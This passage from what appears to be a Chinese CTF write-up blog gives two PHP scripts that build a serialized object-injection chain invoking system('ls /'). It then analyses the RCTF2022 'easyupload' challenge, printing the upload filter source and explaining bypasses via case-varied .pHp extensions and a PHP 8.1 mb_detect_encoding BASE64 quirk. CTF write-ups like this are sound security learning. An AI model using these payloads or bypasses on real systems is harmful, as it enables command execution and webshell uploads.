<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"><span class="variable">$Show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$Sorry</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$Sorry2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="comment">//这里实例化两次sorry是因为当，脚本运行完毕后，会执行__destruct()魔术方法，从而清空了变量引用，也就相当于关闭了这个类，</span></span><br><span class="line"><span class="comment">//但是后续还需要调用其中的魔术方法，所以需要再次实例化，并重新为password和name相同赋值</span></span><br><span class="line"><span class="variable">$Secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry</span>-&gt;hint = <span class="variable">$Show</span>;</span><br><span class="line"><span class="variable">$Show</span>-&gt;ctf = <span class="variable">$Secret</span>;</span><br><span class="line"><span class="variable">$Secret</span>-&gt;code = <span class="variable">$Sorry2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;name = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;password = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="variable">$Sorry2</span>-&gt;key = <span class="variable">$Fine</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;cmd = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$Fine</span>-&gt;content = <span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><strong>补充</strong>：另一种写法，一定要<code>url</code>编码，因为里边有不可见字符。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span>, <span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span>, <span class="variable">$time</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;time = <span class="variable">$time</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span>,<span class="variable">$hint</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint  = <span class="variable">$hint</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Sorry</span>= <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>(<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>(<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="string">&#x27;cc&#x27;</span>,<span class="keyword">new</span> <span class="title function_ invoke__">fine</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>))),<span class="string">&#x27;cc&#x27;</span>),<span class="string">&#x27;cc&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为这里没有修改变量修饰，</span></span><br><span class="line"><span class="comment">//对于private修饰变量无法直接传参，需要实例化类xx(a,b)，然后才能成功传参，当然public类也可以用这种方法传参，只是没必要，但这里是用了的</span></span><br><span class="line"><span class="comment">//比如sorry类中name和password变量赋值为cc后，后面实例化的show类就是赋值给public hint变量，是按变量声明顺序来进行赋值的</span></span><br><span class="line"><span class="comment">//这里的嵌套就是同上面的payload一样，只是把变量赋值为实例化的类，实例化类的里面再嵌入变量值和其他实例化的类</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$Sorry</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="RCTF2022"><a href="#RCTF2022" class="headerlink" title="RCTF2022"></a>RCTF2022</h1><h2 id="easyupload"><a href="#easyupload" class="headerlink" title="easyupload"></a>easyupload</h2><blockquote>
<p>附件</p>
<p><a href="https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar">https://adworld.xctf.org.cn/media/file/task/0e2ca001-097f-437c-b5ae-a9e04773b9bc.tar</a></p>
</blockquote>
<p><img src="/2022/06/26/Game-wp/image-20230122145933429.png" alt="image-20230122145933429"></p>
<p>这是一个文件上传的题目，题目开始给出了题目附件，先查看一下源码查看上传文件过滤哪些东西</p>
<p>核心就是一个<code>UploadController.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Filesystem</span>\<span class="title">Path</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Annotation</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invalid</span>(<span class="params"><span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;error occurs: <span class="subst">$msg</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#[Route</span>(<span class="string">&#x27;/&#x27;</span>, <span class="attr">name</span>: <span class="string">&#x27;upload&#x27;</span>)<span class="meta">]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadHtml</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file</span> = @<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$file</span> == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">                <span class="comment">//&#x27;&lt;p&gt;Before start you should know that it\&#x27;s not a good challenge.You can\&#x27;t get anything from this challenge.If you hate this challenge, just skip plz. &lt;/p&gt;&lt;p&gt;这道题并不是一道好题，你不会从这道题上获得任何东西。如果你讨厌这道题就直接跳过吧。&lt;/p&gt;&#x27;</span></span><br><span class="line">                <span class="variable">$uploadHtml</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$ext</span> = <span class="title class_">Path</span>::<span class="title function_ invoke__">getExtension</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$request</span>-&gt;server-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload success&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&quot;upload failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到过滤包含了<code>后缀过滤</code>和<code>文件内容过滤</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;BASE64&quot;</span>,<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>]);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext_blacklist = [</span><br><span class="line">            <span class="string">&quot;php&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ini&quot;</span>,</span><br><span class="line">            <span class="string">&quot;phtml&quot;</span>,</span><br><span class="line">            <span class="string">&quot;htaccess&quot;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content_blacklist = [<span class="string">&quot;&lt;?&quot;</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;handler&quot;</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>后缀名黑名单</strong>过滤代码，过滤了<code>php,ini,phtml,htaccess</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>], <span class="string">&quot;..&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking path travel&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;ext_blacklist <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$ext</span>, <span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$ext</span> extension.&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里的这里是用<code>strstr()</code>进行匹配，而<code>strstr()</code>是区分大小写的，所以这里可以用<code>.pHp</code>，或者<code>.PHP</code>进行绕过对<code>.php</code>的过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;<span class="subst">$dir</span>/upload/&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>[<span class="string">&quot;name&quot;</span>]));</span><br></pre></td></tr></table></figure>

<p>代码最后可以看到后缀名被<code>strtolower()</code>处理，转化为小写，但是这里已经不影响，因为前面已经绕过了过滤</p>
</blockquote>
<blockquote>
<p><strong>文件内容黑名单</strong>明确了<code>&quot;&lt;?&quot;, &quot;php&quot;, &quot;handler&quot;</code></p>
<p>可以看到代码中对文件内容的判断，其中涉及了<code>mb_detect_encoding()</code>函数</p>
<blockquote>
<p><code>mb_detect_encoding()</code>：从有序的候选列表中 检测字符串 最可能的字符编码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_detect_encoding</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span>|<span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$encodings</span> = <span class="literal">null</span>, <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span>): <span class="keyword">string</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p><code>$strict</code>控制在列出的任何编码中字符串无效时的行为。如果<code>strict</code>设置为<code>false</code>，则返回最接近的匹配编码;如果<code>strict</code>设置为<code>true</code>，则返回<code>false</code>。</p>
<p>当<code>$encodings</code>省略或者为空时，会从<code>mb_detect_order()</code>中按顺序进行测试</p>
<p>该题代码中为<code>mb_detect_order([&quot;BASE64&quot;,&quot;ASCII&quot;,&quot;UTF-8&quot;]);</code></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">           <span class="variable">$charset</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$content</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">           <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$charset</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">                   <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking invalid format.&quot;</span>);</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的判断主要是有个<code>charset</code>的判断, 如果 <code>mb_detect_encoding()</code> 的结果不为空【<code>false !== $charset</code>】, 就会对文件内容进行判断，而当为空时【<code>false == $charset</code>】，就会直接返回退出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$charset</span> == <span class="string">&quot;BASE64&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;content_blacklist <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>, <span class="variable">$v</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">invalid</span>(<span class="string">&quot;fucking <span class="subst">$v</span> .&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而且在这段代码中有显示，不仅需要<code>$charset</code>不为空，还需要<code>$charset==&quot;BASE64&quot;</code></p>
<p>判断完<code>$charset</code>后，又对内容进行正则匹配，如果出现，就会失败了，所以需要在</p>
<p><img src="/2022/06/26/Game-wp/image-20230122163200935.png" alt="image-20230122163200935"></p>
<p>这里匹配内容的代码为<code>stristr($content, $v)!==false</code></p>
<p><strong>stristr</strong></p>
</blockquote>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p><code>https://github.com/php/php-src/issues/9008</code></p>
<p>它会导致奇怪的结果。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mb_detect_order</span>([<span class="string">&quot;ASCII&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;BASE64&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(</span><br><span class="line">    <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="literal">null</span>, <span class="literal">true</span>),</span><br><span class="line">    <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$string</span>, <span class="title function_ invoke__">mb_detect_order</span>(), <span class="literal">true</span>),</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$string</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">    <span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$string</span>, <span class="string">&quot;BASE64&quot;</span>),</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到的结果发现</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">Output for <span class="number">8.2</span><span class="number">.0</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.0</span><span class="number">.1</span> - <span class="number">8.0</span><span class="number">.26</span><span class="punctuation">,</span> <span class="number">8.1</span><span class="number">.10</span> - <span class="number">8.1</span><span class="number">.13</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br><span class="line"></span><br><span class="line">Output for <span class="number">8.1</span><span class="number">.0</span> - <span class="number">8.1</span><span class="number">.9</span></span><br><span class="line">string(<span class="number">6</span>) <span class="string">&quot;BASE64&quot;</span></span><br><span class="line">string(<span class="number">5</span>) <span class="string">&quot;ASCII&quot;</span></span><br><span class="line">string(<span class="number">2</span>) <span class="string">&quot;&lt;s&quot;</span></span><br><span class="line">string(<span class="number">4</span>) <span class="string">&quot;PHM=&quot;</span></span><br></pre></td></tr></table></figure>

<p><code>mb_detect_encoding($string, null, true)</code>返回值</p>
<p>只有在<code>PHP</code>版本在<code>8.1.0 - 8.1.9</code>时会返回<code>base64</code>，而在其他版本都是默认识别为<code>ASCII</code></p>
<p>查看返回包中数据可知</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 22 Jan 2023 08:40:35 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Apache/2.4.54 (Debian)</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/8.1.9</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, private</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>14</span><br></pre></td></tr></table></figure>

<p>正好是<code>8.1.0 - 8.1.9</code>版本</p>
</blockquote>
